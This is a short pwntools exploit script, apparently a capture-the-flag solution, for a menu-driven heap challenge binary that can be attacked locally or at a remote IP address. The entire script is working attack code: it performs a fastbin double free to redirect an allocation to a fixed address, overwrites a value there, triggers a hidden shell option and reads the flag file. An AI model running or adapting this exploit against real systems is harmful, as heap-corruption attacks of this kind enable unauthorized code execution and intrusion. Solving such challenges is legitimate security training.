from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./pwn"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("1.95.36.136", 2051)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


def add(idx, size):
    io.sendlineafter("choice:", b"1")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("size:", str(size))


def edit(idx, size, content):
    io.sendlineafter("choice:", b"3")
    io.sendlineafter("index:", str(idx))
    io.sendlineafter("length:", str(size))
    io.sendlineafter("content:", content)


def delete(idx):
    io.sendlineafter("choice:", b"2")
    io.sendlineafter("index:", str(idx))


def shell():
    io.sendlineafter("choice:", b"5")

add(0, 0x60)
add(1, 0x60)
add(2, 0x60)
add(3, 0x60)

delete(0)
delete(2)
delete(0)
ddebug()
edit(0, 8, p64(0x6020bc))
add(0, 0x60)
# add(0, 0x60)
add(0, 0x60)
edit(0, 12, b"a"*4+p64(520))
# ddebug("b *0x400AB7\ncontinue")
shell()

io.sendline(b"cat flag*")
io.interactive()
